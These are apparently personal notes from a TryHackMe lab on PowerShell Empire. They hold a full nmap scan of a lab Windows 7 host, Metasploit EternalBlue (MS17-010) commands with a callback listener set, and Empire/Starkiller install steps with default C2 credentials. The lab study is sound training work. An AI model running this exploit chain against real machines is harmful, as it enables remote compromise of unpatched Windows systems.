# https://tryhackme.com/room/rppsempire

```bash
=================================
10.201.95.161 -- domain.com -- win x32/x64
=================================

export TARGET=10.201.95.161
2025-08-19 19:16:48 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan 10.201.95.161
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2025-08-19T23:18:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-08-18T23:16:07
|_Not valid after:  2026-02-17T23:16:07
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2025-08-19T23:17:59+00:00
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 3 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-19T18:17:59-05:00
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:c1:08:66:6f (unknown)
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
| smb2-time: 
|   date: 2025-08-19T23:17:59
|_  start_date: 2025-08-19T23:16:05
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.201.95.161
set LHOST 10.6.4.0
set LPORT 9871
2025-08-19 19:22:03 -- exploit

### EMPIRE ###
sudo apt install -y powershell-empire starkiller
sudo powershell-empire server

starkiller
	Uri: 127.0.0.1:1337
	User: empireadmin
	Pass: password123
```